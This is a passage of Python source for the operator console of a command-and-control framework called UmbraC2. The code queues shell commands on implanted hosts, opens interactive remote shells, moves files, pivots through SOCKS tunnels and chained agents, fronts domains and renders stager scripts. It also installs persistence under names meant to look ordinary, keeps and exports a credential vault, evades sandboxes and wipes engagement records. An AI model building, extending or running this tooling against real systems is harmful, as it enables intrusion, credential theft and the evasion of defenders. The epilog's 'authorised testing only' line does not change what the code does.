                print_whoami(self.client.whoami())
            elif cmd in ("chat", "say"):
                if rest:
                    to = ""
                    body = list(rest)
                    if body[0].startswith("@") and len(body[0]) > 1:
                        to = body.pop(0)[1:]
                    text = " ".join(body).strip()
                    if not text:
                        print(f"usage: say [@operator] <message>")
                        return True
                    self.client.say(text, to)
                    print(f"sent -> {to}" if to else "sent")
                else:
                    print_chat(self.client.chat_history(20))
            elif cmd in ("claim", "take"):
                if not rest:
                    print("usage: claim <task-id>")
                    return True
                data = self.client.claim(rest[0])
                print(f"claimed {rest[0]} ({data.get('state', '?')})")
            elif cmd in ("release", "drop"):
                if not rest:
                    print("usage: release <task-id>")
                    return True
                self.client.release(rest[0])
                print(f"released {rest[0]}")
            elif cmd == "focus":
                data = self.client.focus(rest[0] if rest else "")
                print(f"focus: {data.get('agent_id') or '(none)'}")
            elif cmd in ("schedule", "cron"):
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_schedules(self.client.schedules())
                elif sub_cmd == "add" and len(rest) >= 3:
                    every = int(rest[3]) if len(rest) > 3 else 300
                    data = self.client.add_schedule(
                        self._resolve(rest[1]), rest[2], every)
                    print(f"scheduled {data['schedule_id']} every {every}s")
                elif sub_cmd in ("rm", "remove") and len(rest) >= 2:
                    self.client.remove_schedule(rest[1])
                    print(f"removed {rest[1]}")
                else:
                    print("usage: schedule [list | add <agent> <kind> [every] | rm <id>]")
            elif cmd in ("operators", "ops"):
                print_operators(self.client.operators())
            elif cmd == "pivot":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_pivots(self.client.pivot_list(), self.client.pivot_sessions())
                elif sub_cmd == "open" and len(rest) >= 2:
                    mode = "socks"
                    host = ""
                    port = 0
                    listen = ""
                    path: List[str] = []
                    for token in rest[2:]:
                        if token.startswith("--mode="):
                            mode = token.split("=", 1)[1]
                        elif token.startswith("--host="):
                            host = token.split("=", 1)[1]
                        elif token.startswith("--port="):
                            port = int(token.split("=", 1)[1])
                        elif token.startswith("--listen="):
                            listen = token.split("=", 1)[1]
                        elif token.startswith("--through="):
                            path.append(token.split("=", 1)[1])
                    data = self.client.pivot_open(
                        rest[1], mode=mode, host=host, port=port, listen=listen,
                        path=path, through=path[0] if path else "")
                    print(f"pivot {data.get('stream')} open on {data.get('listen')}")
                elif sub_cmd in ("close", "rm") and len(rest) >= 2:
                    self.client.pivot_close(rest[1])
                    print(f"closed {rest[1]}")
                else:
                    print("usage: pivot [list | open <agent> [--mode=] [--host=] [--port=] "
                          "[--listen=] [--through=] | close <tunnel>]")
            elif cmd == "vpn":
                sub_cmd = rest[0] if rest else "status"
                if sub_cmd == "status":
                    print_vpn_status(self.client.vpn_status())
                elif sub_cmd == "peers":
                    print_vpn_peers(self.client.vpn_peers())
                elif sub_cmd == "allocate" and len(rest) >= 2:
                    print(f"{rest[1]} -> {self.client.vpn_allocate(rest[1])}")
                else:
                    print("usage: vpn [status | peers | allocate <agent>]")
            elif cmd == "armory":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_armory(self.client.armory_list())
                elif sub_cmd == "install" and len(rest) >= 2:
                    data = self.client.armory_install(rest[1])
                    print(f"installed {data.get('name')} ({data.get('size')} bytes)")
                elif sub_cmd in ("remove", "rm") and len(rest) >= 2:
                    self.client.armory_remove(rest[1])
                    print(f"removed {rest[1]}")
                elif sub_cmd == "run" and len(rest) >= 3:
                    task_id = self.client.armory_run(rest[1], rest[2])
                    self.note_task(task_id, rest[2], f"armory:{rest[1]}")
                    print(f"queued {task_id}")
                else:
                    print("usage: armory [list | install <name> | remove <name> | run <name> <agent>]")
            elif cmd == "alias":
                sub_cmd = rest[0] if rest else "list"
                if sub_cmd == "list":
                    print_aliases(self.client.alias_list())
                elif sub_cmd == "run" and len(rest) >= 3:
                    task_id = self.client.alias_run(rest[1], rest[2])
                    self.note_task(task_id, rest[2], f"alias:{rest[1]}")
                    print(f"queued {task_id}")
                else:
                    print("usage: alias [list | run <name> <agent>]")
            elif cmd in ("team-sync", "team"):
                print_team(self.client.team_sync())
            elif cmd == "stager":
                parts = dict()
                for token in rest:
                    if token.startswith("--") and "=" in token:
                        key, _, value = token[2:].partition("=")
                        parts[key.replace("-", "_")] = value
                script = self.client.stager_generate(
                    platform=parts.get("platform", "windows"),
                    transport=parts.get("transport", "tcp"),
                    server=parts.get("server", ""),
                    url=parts.get("url", ""),
                    sha256=parts.get("sha256", ""),
                    agent_id=parts.get("agent_id", ""),
                )
                print(script)
            elif cmd == "stats":
                print(json.dumps(self.client.stats(), indent=2, default=str, sort_keys=True))
            elif cmd == "raw":
                if len(rest) < 1:
                    print("usage: raw <command> [json-args]")
                    return True
                args = json.loads(" ".join(rest[1:])) if len(rest) > 1 else {}
                res = self.client.rpc(rest[0], args)
                print(json.dumps({"ok": res.ok, "data": res.data, "error": res.error}, indent=2, default=str))
            else:
                print(f"unknown command {cmd!r} (try `help`)")
        except OperatorError as exc:
            print(f"error: {exc}")
        except json.JSONDecodeError as exc:
            print(f"invalid json: {exc}")
        except (ValueError, IndexError) as exc:
            print(f"invalid arguments: {exc}")
        return True

    def _submit_and_maybe_wait(self, kind: str, args: Dict[str, Any], *, watch: bool) -> None:
        agent = self._resolve(None)
        task_id = self.client.submit(agent, kind, args)
        self.note_task(task_id, agent, kind, args)
        print(f"queued {task_id} for {agent} ({kind})")
        if watch or self.watch:
            try:
                task = self.client.wait_for_result(task_id, timeout=120)
            except OperatorError as exc:
                print(f"error: {exc}")
                return
            self.note_result(task_id, task)
            print_task_result(task)
        else:
            print("use `result <task-id>` to collect the output")


def _progress_printer() -> Any:
    """Return a `(done, total, final=False)` callback that redraws one stderr line."""
    state = {"last": -1.0}

    def show(done: int, total: int, *, final: bool = False) -> None:
        pct = (done / total * 100.0) if total > 0 else 0.0
        if not final and pct - state["last"] < 1.0:
            return
        state["last"] = pct
        total_txt = f"{total}" if total > 0 else "?"
        end = "\n" if final else "\r"
        print(f"  {done}/{total_txt} bytes ({pct:5.1f}%)", file=sys.stderr, end=end, flush=True)

    return show


def print_help() -> None:
    print(
        """commands:
  help                      show this help
  agents | ls [filter]      list agents (state=online, tag=dc, ...)
  tag <agent> <label>       label an agent
  session [cmd]            open an interactive session
  chain <agent> k:{...}    queue a multi-stage task
  triage <path>            triage a file on the agent
  find <name>              search for files on the agent
  netinfo                  the network configuration of the agent
  scan <target> [ports=…]  scan a range of hosts for open ports
  resolve <host>           where a name points at
  env [filter=…]           the environment of the agent
  touch <path>             create a file on the agent and stamp it
  artifact [list|put|get|remove]  the team server's file store
  panic [agent-id]         tell the beacons to exit (asks twice)
  alerts                   the alert rules of the server
  policy <agent> sleep=60   push the beacon cadence
  whoami | me               your identity, role and allowed commands
  operators                 list connected operator consoles
  chat [@op] [message]      send (or read) operator chat
  focus [agent-id]          tell the team which agent you are on
  claim <task-id>           take ownership of a task
  release <task-id>         drop your claim
  schedule [list|add|rm]    recurring tasks
  use <agent-id>            select the current agent
  info [agent-id]           full agent record
  run <command>             queue a shell task and print its result
  exec <kind> [json]        queue arbitrary task (sysinfo, ls, download, ...)
  get <remote> <local>      pull a file from the current agent
  put <local> <remote>      push a file to the current agent
  download <agent> <remote> <local>   pull a file (chunked, verified)
  upload <agent> <local> <remote>     push a file (chunked, verified)
  tasks [limit]             recent tasks for the current agent
  result <task-id>          print a task result
  cancel <task-id>          cancel a queued task
  retry <task-id>           run a finished task again
  persist [method]          install the implant so it survives a reboot
  persist-list              what is installed on an agent
  persist-verify            check that the entries are still there
  persist-migrate           move from one technique to another
  persist-health            the persistence verdict of an agent
  persist-report            the persistence of the whole fleet
  evade-report              the posture of an agent or of the fleet
  evade-posture             how the environment changes the behaviour
  evade-profile             the schedule the beacon sleeps by
  evade-shape               the shape of the traffic
  evade-killswitch          the moment the implant stops existing
  hygiene                   the memory and the process hygiene
  update <path>             replace the running implant
  browse [path]             list the files under a path
  report [agent]            write a report about an agent
  sessions                  the interactive sessions that are open
  wipe                      clear the record of the engagement (asks twice)
  events [limit]            the recent events of the server's journal
  watch [on|off]            toggle automatic result printing
  sleep <secs> [jitter%]    change the beacon interval
  kill [agent-id]           tell an agent to exit
  audit [limit]             recent operator actions (audit trail)
  stats                     server statistics
  pivot [list|open|close|claims|release]
                          pivot through an agent (socks5 / port forward)
  vpn [status|peers|alloc]  the layer-3 tunnel
  armory [list|inst|rm|run] the extension store
  alias [list|run]          saved commands
  team-sync                 one snapshot of the team
  stager [options]          render a stager script
  db [action] [value]       the local notebook (stats|tasks|results|notes|search|note)
  raw <cmd> [json]          send a raw RPC
  quit                      disconnect and exit"""
    )


def wait_for_session_id(client: OperatorClient, task_id: str, timeout: float) -> str:
    """Wait for the id of an open session.

    The id travels with the first output chunk, so the operator can address
    the session before it produced anything.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        event = client.next_event(timeout=1.0)
        if event is None:
            continue
        if event.get("kind") == "task.output" and event.get("task_id") == task_id:
            data = event.get("data") or {}
            meta = data.get("meta") or {}
            if meta.get("session"):
                return str(meta["session"])
    return ""


def stream_session(client: OperatorClient, console: Console, agent_id: str,
                   task_id: str, timeout: float) -> None:
    """Type into a session and print what comes back.

    The output arrives as `task.output` events, so a reader thread prints it
    while the main thread reads the operator's input.
    """
    state = {"session": "", "stop": False}
    pending: List[str] = []
    lock = threading.Lock()

    def send(line: str) -> None:
        try:
            client.session_input(agent_id, state["session"], line.encode())
        except OperatorError as exc:
            print(f"session write failed: {exc}", file=sys.stderr)

    def pump() -> None:
        deadline = time.time() + timeout
        while not state["stop"] and time.time() < deadline:
            event = client.next_event(timeout=0.5)
            if event is None:
                continue
            kind = event.get("kind", "")
            if kind == "task.output" and event.get("task_id") == task_id:
                data = event.get("data") or {}
                meta = data.get("meta") or {}
                if not state["session"] and meta.get("session"):
                    state["session"] = str(meta["session"])
                    # The lines that were typed before the session was ready
                    # go out now.
                    with lock:
                        waiting = list(pending)
                        pending.clear()
                    for line in waiting:
                        send(line)
                text = data.get("output")
                if text:
                    sys.stdout.write(text)
                    sys.stdout.flush()
            elif kind == "task.result" and event.get("task_id") == task_id:
                break

    worker = threading.Thread(target=pump, daemon=True)
    worker.start()
    try:
        for line in sys.stdin:
            with lock:
                ready = bool(state["session"])
                if not ready:
                    pending.append(line)
            if ready:
                send(line)
    except KeyboardInterrupt:
        pass
    finally:
        state["stop"] = True
        worker.join(timeout=2.0)
    if state["session"]:
        try:
            client.close_session(agent_id, state["session"])
        except OperatorError:
            pass


def parse_filter(text: str) -> Dict[str, str]:
    """Parse a filter string ("state=online,tag=dc") into a dictionary.

    The console speaks the same filter language as the server, so an operator
    can write the selection once and use it for finding agents and for acting
    on them.
    """
    out: Dict[str, str] = {}
    for part in (text or "").split(","):
        part = part.strip()
        if not part:
            continue
        key, _, value = part.partition("=")
        key, value = key.strip(), value.strip()
        if key and value:
            out[key] = value
    return out


# ---------------------------------------------------------------------------
# local state database
# ---------------------------------------------------------------------------
def open_state(path: str) -> Optional[db.StateStore]:
    """Open the local notebook.

    A missing or broken database must never stop the console: the server
    holds the authoritative state, the notebook is a convenience.
    """
    if not path:
        return None
    try:
        return db.StateStore(path).open()
    except db.StateError as exc:
        print(f"local state unavailable: {exc}", file=sys.stderr)
        return None


def print_db_tasks(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no tasks recorded")
        return
    print(table(
        ["task", "agent", "kind", "state", "when"],
        [[r.get("task_id", ""), r.get("agent", ""), r.get("kind", ""),
          r.get("state", ""), fmt_ts(r.get("submitted", 0))] for r in rows]))


def print_db_results(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no results recorded")
        return
    print(table(
        ["task", "code", "when", "output"],
        [[r.get("task_id", ""), str(r.get("code", 0)), fmt_ts(r.get("finished", 0)),
          short(decode_out(r.get("output") or b""), 48)] for r in rows]))


def print_db_notes(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("no notes")
        return
    print(table(
        ["when", "agent", "note"],
        [[fmt_ts(r.get("created", 0)), r.get("agent", ""), short(r.get("body", ""), 60)]
         for r in rows]))


def print_db_search(rows: List[Dict[str, Any]]) -> None:
    if not rows:
        print("nothing matched")
        return
    for row in rows:
        stamp = fmt_ts(row.get("at", 0))
        where = row.get("where", "?")
        if where == "task":
            print(f"[{stamp}] task {row['task_id']} on {row.get('agent') or '-'} "
                  f"({row.get('kind', '')})")
        elif where == "note":
            print(f"[{stamp}] note on {row.get('agent') or '-'}: {row.get('body', '')}")
        else:
            print(f"[{stamp}] result {row.get('task_id', '')} "
                  f"(code {row.get('code', 0)}): {row.get('excerpt', '')}")


def run_db_command(args: argparse.Namespace) -> int:
    """`umbra db ...` -- the local notebook; it needs no server connection."""
    store = open_state(args.db)
    if store is None:
        return 2
    try:
        if args.action == "stats":
            stats = store.stats()
            if args.json:
                print(json.dumps(stats, indent=2, sort_keys=True, default=json_default))
            else:
                print(f"database : {stats['path']}")
                print(f"sessions : {stats['sessions']}")
                print(f"tasks    : {stats['tasks']}")
                print(f"results  : {stats['results']}")
                print(f"notes    : {stats['notes']}")
                print(f"agents   : {stats['agents']}")
                for kind in stats["kinds"]:
                    print(f"  {kind['kind']:<12} {kind['count']}")
        elif args.action == "tasks":
            rows = store.tasks(args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_tasks(rows)
        elif args.action == "results":
            rows = store.results(args.value, args.limit)
            if args.json:
                print(json.dumps(
                    [{**r, "output": decode_out(r.get("output"))} for r in rows],
                    indent=2, sort_keys=True, default=json_default))
            else:
                print_db_results(rows)
        elif args.action == "notes":
            rows = store.notes(args.agent or args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_notes(rows)
        elif args.action == "search":
            rows = store.search(args.value, args.limit)
            if args.json:
                print(json.dumps(rows, indent=2, sort_keys=True, default=json_default))
            else:
                print_db_search(rows)
        elif args.action == "note":
            body = args.value or args.agent
            if not body.strip():
                print("usage: umbra db note \"what I found\"", file=sys.stderr)
                return 2
            note_id = store.add_note(body, args.agent)
            if args.json:
                print(json.dumps({"note_id": note_id, "agent": args.agent},
                                 indent=2, sort_keys=True))
            else:
                print(f"note {note_id} recorded")
        else:  # export
            target = args.out or "umbra-state.json"
            path = store.export(target)
            if args.json:
                print(json.dumps({"exported": path}, indent=2, sort_keys=True))
            else:
                print(f"exported to {path}")
    except db.StateError as exc:
        print(f"local state error: {exc}", file=sys.stderr)
        return 1
    finally:
        store.close()
    return 0


# ---------------------------------------------------------------------------
# argument parsing
# ---------------------------------------------------------------------------
def read_token(args: argparse.Namespace) -> str:
    if args.token:
        return args.token
    if args.token_file:
        try:
            with open(args.token_file, "r", encoding="utf-8") as fh:
                return fh.read().strip()
        except OSError as exc:
            raise SystemExit(f"cannot read token file: {exc}")
    env = os.environ.get("UMBRA_OPERATOR_TOKEN", "")
    if env:
        return env
    if sys.stdin.isatty():
        return getpass.getpass("operator token: ").strip()
    raise SystemExit("no operator token (use --token, --token-file or $UMBRA_OPERATOR_TOKEN)")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="umbra",
        description="UmbraC2 operator console (umbra/v1)",
        epilog="This tool is for authorised security testing only.",
        # No abbreviations: `--to` must not be guessed as `--token`, and an
        # ambiguous prefix should fail instead of silently picking one.
        allow_abbrev=False,
    )
    p.add_argument("--server", "-s", default=os.environ.get("UMBRA_SERVER", "127.0.0.1:4002"),
                   help="team server operator listener (default 127.0.0.1:4002)")
    p.add_argument("--operator", "-o", default=os.environ.get("UMBRA_OPERATOR", "operator"),
                   help="operator identity (must match a server token entry)")
    p.add_argument("--token", "-k", default=None, help="operator token (prefer --token-file or env)")
    p.add_argument("--token-file", default=None, help="file containing the operator token")
    p.add_argument("--timeout", type=float, default=15.0, help="socket/RPC timeout in seconds")
    p.add_argument("--tls", action="store_true",
                   help="wrap the operator connection in TLS (the server needs tls_listen)")
    p.add_argument("--tls-ca", default=os.environ.get("UMBRA_TLS_CA", ""),
                   help="PEM file with the certificate authority that signed the server certificate")
    p.add_argument("--tls-server-name", default=os.environ.get("UMBRA_TLS_SERVER_NAME", ""),
                   help="name the server certificate has to carry (SNI and verification)")
    p.add_argument("--tls-cert", default=os.environ.get("UMBRA_TLS_CERT", ""),
                   help="client certificate for a server that asks for one (mTLS)")
    p.add_argument("--tls-key", default=os.environ.get("UMBRA_TLS_KEY", ""),
                   help="private key of the client certificate")
    p.add_argument("--watch", action="store_true", help="print events as they arrive")
    p.add_argument("--quiet", action="store_true", help="do not print the event banner")
    p.add_argument("--db", default=os.environ.get(
        "UMBRA_DB", os.path.join(os.path.expanduser("~"), ".umbra", "state.db")),
        help="local state database (SQLite); empty disables the notebook")
    p.add_argument("--json", action="store_true",
                   help="machine-readable output for agents/tasks/info/stats/result")
    p.add_argument("--version", action="version", version=f"umbra {__version__} ({wire.SUITE_NAMES[1]}, umbra/v1)")

    sub = p.add_subparsers(dest="cmd")

    agents_cmd = sub.add_parser("agents", help="list agents")
    agents_cmd.add_argument("--state", default="", help="filter: online or offline")
    agents_cmd.add_argument("--transport", default="", help="filter: tcp, http, ws, dns")
    agents_cmd.add_argument("--os", default="", help="filter: the operating system")
    agents_cmd.add_argument("--arch", default="", help="filter: the architecture")
    agents_cmd.add_argument("--tag", default="", help="filter: agents carrying this tag")
    agents_cmd.add_argument("--user", default="", help="filter: the account the beacon runs as")
    sub.add_parser("operators", help="list connected operator consoles")
    sub.add_parser("whoami", help="your operator identity, role and capabilities")

    chat = sub.add_parser("chat", help="operator chat")
    chat.add_argument("message", nargs="*", help="send a message (omit to read history)")
    chat.add_argument("--limit", type=int, default=20)
    chat.add_argument("--to", default="", help="address one operator instead of the team")

    focus = sub.add_parser("focus", help="announce the agent you are working on")
    focus.add_argument("agent", nargs="?", default="", help="agent id (omit to clear)")

    claim = sub.add_parser("claim", help="take ownership of a task")
    claim.add_argument("task_id")

    release = sub.add_parser("release", help="drop your claim on a task")
    release.add_argument("task_id")

    sched = sub.add_parser("schedule", help="recurring tasks")
    sched.add_argument("action", choices=["list", "add", "rm"])
    sched.add_argument("target", nargs="?", help="agent id (add) or schedule id (rm)")
    sched.add_argument("kind", nargs="?", help="task kind for add")
    sched.add_argument("--every", type=int, default=300, help="interval in seconds (min 5)")
    sched.add_argument("--args", default="{}", help="task arguments as JSON (add)")
    sub.add_parser("stats", help="server statistics")

    audit_cmd = sub.add_parser("audit", help="recent operator actions (audit trail)")
    audit_cmd.add_argument("--limit", type=int, default=50)

    info = sub.add_parser("info", help="show one agent")
    info.add_argument("agent")

    run = sub.add_parser("run", help="queue a shell command")
    run.add_argument("agent")
    run.add_argument("command", nargs=argparse.REMAINDER)
    run.add_argument("--wait", action="store_true", help="wait for and print the result")
    run.add_argument("--timeout", type=float, default=120.0)

    task = sub.add_parser("task", help="queue an arbitrary task")
    task.add_argument("agent", nargs="?", default="", help="agent id")
    task.add_argument("kind", nargs="?", default="", help="task kind")
    task.add_argument("--kind", dest="kind_flag", default="",
                      help="task kind (use this with --agents, where there is no single agent)")
    task.add_argument("--args", default="{}", help="task arguments as JSON")
    task.add_argument("--wait", action="store_true")
    task.add_argument("--timeout", type=float, default=120.0)
    task.add_argument("--agents", default="",
                      help="comma separated agent ids: queue the task on all of them")
    task.add_argument("--filter", default="",
                      help="filter that selects the agents: state=online,tag=dc")

    down = sub.add_parser("download", help="pull a file from an agent (chunked)")
    down.add_argument("agent")
    down.add_argument("remote", help="path on the agent")
    down.add_argument("local", help="destination path on this host")
    down.add_argument("--chunk", type=int, default=0, help="bytes per request (max 900 KiB)")
    down.add_argument("--timeout", type=float, default=120.0, help="per-chunk timeout")

    up = sub.add_parser("upload", help="push a file to an agent (chunked)")
    up.add_argument("agent")
    up.add_argument("local", help="source path on this host")
    up.add_argument("remote", help="destination path on the agent")
    up.add_argument("--chunk", type=int, default=0, help="bytes per request (max 900 KiB)")
    up.add_argument("--timeout", type=float, default=120.0, help="per-chunk timeout")

    tasks = sub.add_parser("tasks", help="list tasks")
    tasks.add_argument("agent", nargs="?", default="", help="agent id (omit for every agent)")
    tasks.add_argument("--limit", type=int, default=20)
    tasks.add_argument("--kind", default="", help="filter: the task kind")
    tasks.add_argument("--state", default="", help="filter: queued, delivered, done, failed")

    result = sub.add_parser("result", help="print a task result")
    result.add_argument("task_id")
    result.add_argument("--out", default="", help="write the output to this file")

    cancel = sub.add_parser("cancel", help="cancel a queued task")
    retry = sub.add_parser("retry", help="run a finished task again")
    retry.add_argument("task_id")
    cancel.add_argument("task_id")

    watch = sub.add_parser("watch", help="stream events until interrupted")
    wipe = sub.add_parser("wipe", help="clear the record of the engagement")
    wipe.add_argument("--yes", action="store_true", help="do not ask")
    sessions_cmd = sub.add_parser("sessions", help="the interactive sessions that are open")
    events_cmd = sub.add_parser("events", help="the recent events of the server's journal")
    events_cmd.add_argument("--limit", type=int, default=50)
    events_cmd.add_argument("--after", type=int, default=0)
    events_cmd.add_argument("--kind", default="")
    events_cmd.add_argument("--agent", default="", help="only the events of one agent")
    watch.add_argument("--limit", type=int, default=0, help="stop after N events (0 = forever)")

    sleep = sub.add_parser("sleep", help="change beacon interval")
    sleep.add_argument("agent")
    sleep.add_argument("seconds", type=int)
    sleep.add_argument("--jitter", type=int, default=20)

    kill = sub.add_parser("kill", help="tell an agent to exit")
    kill.add_argument("agent")

    # -- pivoting -------------------------------------------------------
    pivot = sub.add_parser("pivot", help="pivot through an agent (socks5 / port forward)")
    pivot.add_argument("action", choices=["list", "open", "close", "claims", "release"],
                       help="list the pivots, open one, close one, list the "
                            "claims or release one")
    pivot.add_argument("target", nargs="?", default="",
                       help="agent id (open), tunnel id (close) or claim (release)")
    pivot.add_argument("--mode", choices=["socks", "forward"], default="socks",
                       help="socks lets the client pick the target, forward fixes it")
    pivot.add_argument("--host", default="", help="remote host (forward mode)")
    pivot.add_argument("--port", type=int, default=0, help="remote port (forward mode)")
    pivot.add_argument("--listen", default="", help="local bind address (default 127.0.0.1:0)")
    pivot.add_argument("--dns", choices=["remote", "local"], default="remote",
                       help="who resolves the name of the target: the target "
                            "(remote) or the server (local)")
    pivot.add_argument("--loopback", action="store_true",
                       help="force the listener onto the loopback of the server")
    pivot.add_argument("--claim", default="",
                       help="name the pivot, so it can be released as a group")
    pivot.add_argument("--through", action="append", default=[],
                       help="the agent this pivot is chained through; repeat it "
                            "to chain the pivot through several agents")
    pivot.add_argument("--user", default="",
                       help="the user the socks5 proxy asks for")
    pivot.add_argument("--password", default="",
                       help="the password the socks5 proxy asks for")

    # -- the route of an agent -------------------------------------------
    transport = sub.add_parser(
        "transport",
        help="the route of an agent: which transport it speaks, in which "
             "order it may fall back",
    )
    transport.add_argument("action", choices=["set", "get", "list"],
                           help="set the route of an agent, read one or list them all")
    transport.add_argument("target", nargs="?", default="",
                           help="agent id (set and get)")
    transport.add_argument("--primary", default="",
                           help="the transport the agent speaks first: tcp, http, dns or ws")
    transport.add_argument("--fallback", default="",
                           help="the order the agent may fall back in, comma separated")
    transport.add_argument("--front", default="",
                           help="the domain the agent puts in the Host header")
    transport.add_argument("--inspect", action="store_true",
                           help="the proxy in front of the agent reads the traffic")
    transport.add_argument("--http-path", default="",
                           help="the route of the HTTP transport")
    transport.add_argument("--ws-path", default="",
                           help="the route of the WebSocket transport")

    # -- layer-3 tunnel --------------------------------------------------
    vpn = sub.add_parser("vpn", help="the layer-3 tunnel between the implants and the server")
    vpn.add_argument("action", choices=["status", "peers", "allocate"])
    vpn.add_argument("target", nargs="?", default="", help="agent id (allocate)")

    # -- extension store -------------------------------------------------
    armory = sub.add_parser("armory", help="the extension store")
    armory.add_argument("action", choices=["list", "install", "remove", "run"])
    armory.add_argument("name", nargs="?", default="", help="extension name")
    armory.add_argument("agent", nargs="?", default="", help="agent id (run)")
    armory.add_argument("--args", default="{}", help="task arguments as JSON (run)")

    # -- command namespace ------------------------------------------------
    alias = sub.add_parser("alias", help="saved commands")
    alias.add_argument("action", choices=["list", "run"])
    alias.add_argument("name", nargs="?", default="", help="alias name")
    alias.add_argument("agent", nargs="?", default="", help="agent id (run)")
    alias.add_argument("--args", default="{}", help="task arguments as JSON (run)")
    alias.add_argument("--arg", action="append", default=[],
                       help="one argument as key=value (run), repeatable")

    sub.add_parser("team-sync", help="one snapshot of the team (agents, operators, chat)")

    # -- stagers ----------------------------------------------------------
    stager = sub.add_parser("stager", help="render a stager script")
    stager.add_argument("--platform", default="windows", choices=["windows", "linux"])
    stager.add_argument("--transport", default="tcp", choices=["tcp", "http"])
    stager.add_argument("--server", default="", help="agent listener (host:port)")
    stager.add_argument("--url", default="", help="url the stager downloads from")
    stager.add_argument("--sha256", default="", help="sha256 of the payload the stager fetches")
    stager.add_argument("--agent-id", default="", help="agent id to bake into the stager")

    # -- interactive sessions ---------------------------------------------
    session = sub.add_parser("session", help="open an interactive session on an agent")
    session.add_argument("agent")
    session.add_argument("--cmd", dest="shell_cmd", default="",
                         help="the command to run (empty starts the platform shell)")
    session.add_argument("--input", dest="input_text", default="",
                         help="write one line and wait for the result")
    session.add_argument("--timeout", type=float, default=300.0)

    # -- multi-stage tasks -------------------------------------------------
    chain = sub.add_parser("chain", help="queue a multi-stage task")
    chain.add_argument("agent")
    chain.add_argument("--stages", default="[]",
                       help='the stages as JSON: [{"kind":"shell","args":{"cmd":"id"}}]')
    chain.add_argument("--wait", action="store_true")
    chain.add_argument("--timeout", type=float, default=300.0)

    # -- alerts ------------------------------------------------------------
    alerts = sub.add_parser("alerts", help="the alert rules of the server")

    # -- installing and updating ------------------------------------------
    persist = sub.add_parser("persist", help="install the implant so it survives a reboot")
    persist.add_argument("agent")
    persist.add_argument("--method", default="auto",
                         help="auto, or a technique id (registry.run, systemd.user, ...)")
    persist.add_argument("--name", default="",
                         help="the label of the entry (it should look ordinary)")
    persist.add_argument("--silent", dest="silent", action="store_true", default=True,
                         help="do not repeat the output of the platform tool (the default)")
    persist.add_argument("--verbose", dest="silent", action="store_false",
                         help="show what the platform tool said")
    persist.add_argument("--no-verify", dest="verify", action="store_false", default=True,
                         help="do not read the entry back after installing it")
    persist.add_argument("--wait", action="store_true")
    persist.add_argument("--timeout", type=float, default=120.0)

    unpersist = sub.add_parser("unpersist", help="remove the start-up entries of the implant")
    unpersist.add_argument("agent")
    unpersist.add_argument("--method", default="all",
                           help="all, or the technique to remove")
    unpersist.add_argument("--wait", action="store_true")
    unpersist.add_argument("--timeout", type=float, default=120.0)

    creds_list = sub.add_parser("creds-list",
                                help="the credential vault of the engagement")
    creds_list.add_argument("--agent", default="", help="only this host")
    creds_list.add_argument("--kind", default="", help="password, hash, ticket, token, key")
    creds_list.add_argument("--query", default="", help="search the account, the target and the note")

    creds_search = sub.add_parser("creds-search",
                                  help="search the credential vault")
    creds_search.add_argument("query")
    creds_search.add_argument("--kind", default="")
    creds_search.add_argument("--agent", default="")

    creds_export = sub.add_parser("creds-export",
                                  help="the material with its value (operator role)")
    creds_export.add_argument("--agent", default="")
    creds_export.add_argument("--kind", default="")
    creds_export.add_argument("--query", default="")

    persist_list = sub.add_parser("persist-list",
                                  help="what is installed on an agent")
    persist_list.add_argument("agent")
    persist_list.add_argument("--wait", action="store_true")
    persist_list.add_argument("--timeout", type=float, default=120.0)

    persist_verify = sub.add_parser("persist-verify",
                                    help="check that the entries are still there")
    persist_verify.add_argument("agent")
    persist_verify.add_argument("--wait", action="store_true")
    persist_verify.add_argument("--timeout", type=float, default=120.0)

    persist_migrate = sub.add_parser("persist-migrate",
                                     help="move from one technique to another")
    persist_migrate.add_argument("agent")
    persist_migrate.add_argument("--from", dest="source", required=True)
    persist_migrate.add_argument("--to", dest="target", required=True)
    persist_migrate.add_argument("--wait", action="store_true")
    persist_migrate.add_argument("--timeout", type=float, default=120.0)

    persist_health = sub.add_parser("persist-health",
                                     help="the persistence verdict of an agent")
    persist_health.add_argument("agent")
    persist_health.add_argument("--wait", action="store_true")
    persist_health.add_argument("--timeout", type=float, default=120.0)

    persist_report = sub.add_parser("persist-report",
                                     help="the persistence of the whole fleet")
    persist_report.add_argument("--agent", default="", help="only this agent")
    persist_report.add_argument("--json", action="store_true")

    evade_report = sub.add_parser("evade-report",
                                   help="the posture of an agent or of the fleet")
    evade_report.add_argument("agent", nargs="?", default="")
    evade_report.add_argument("--wait", action="store_true")
    evade_report.add_argument("--timeout", type=float, default=120.0)
    evade_report.add_argument("--json", action="store_true")

    evade_posture = sub.add_parser(
        "evade-posture", help="how the environment changes the behaviour of the implant")
    evade_posture.add_argument("agent")
    evade_posture.add_argument("--silence", dest="silence", action="store_true", default=None,
                               help="the implant stops answering in a sandbox")
    evade_posture.add_argument("--no-silence", dest="silence", action="store_false")
    evade_posture.add_argument("--slow", dest="slow", action="store_true", default=None,
                               help="the implant slows down in a sandbox")
    evade_posture.add_argument("--no-slow", dest="slow", action="store_false")
    evade_posture.add_argument("--virtual-factor", type=int, default=0,
                               help="the factor a virtual host stretches the sleep with")
    evade_posture.add_argument("--sandbox-factor", type=int, default=0,
                               help="the factor a sandbox stretches the sleep with")
    evade_posture.add_argument("--lab-factor", type=int, default=0)
    evade_posture.add_argument("--developer-factor", type=int, default=0)
    evade_posture.add_argument("--jitter-bonus", type=int, default=0)
    evade_posture.add_argument("--wait", action="store_true")
    evade_posture.add_argument("--timeout", type=float, default=120.0)
    evade_posture.add_argument("--json", action="store_true")

    evade_profile = sub.add_parser("evade-profile", help="the schedule the beacon sleeps by")
    evade_profile.add_argument("agent")
    evade_profile.add_argument("--base", type=int, default=0, help="the base interval")
    evade_profile.add_argument("--busy-start", type=int, default=0, help="the first working hour")
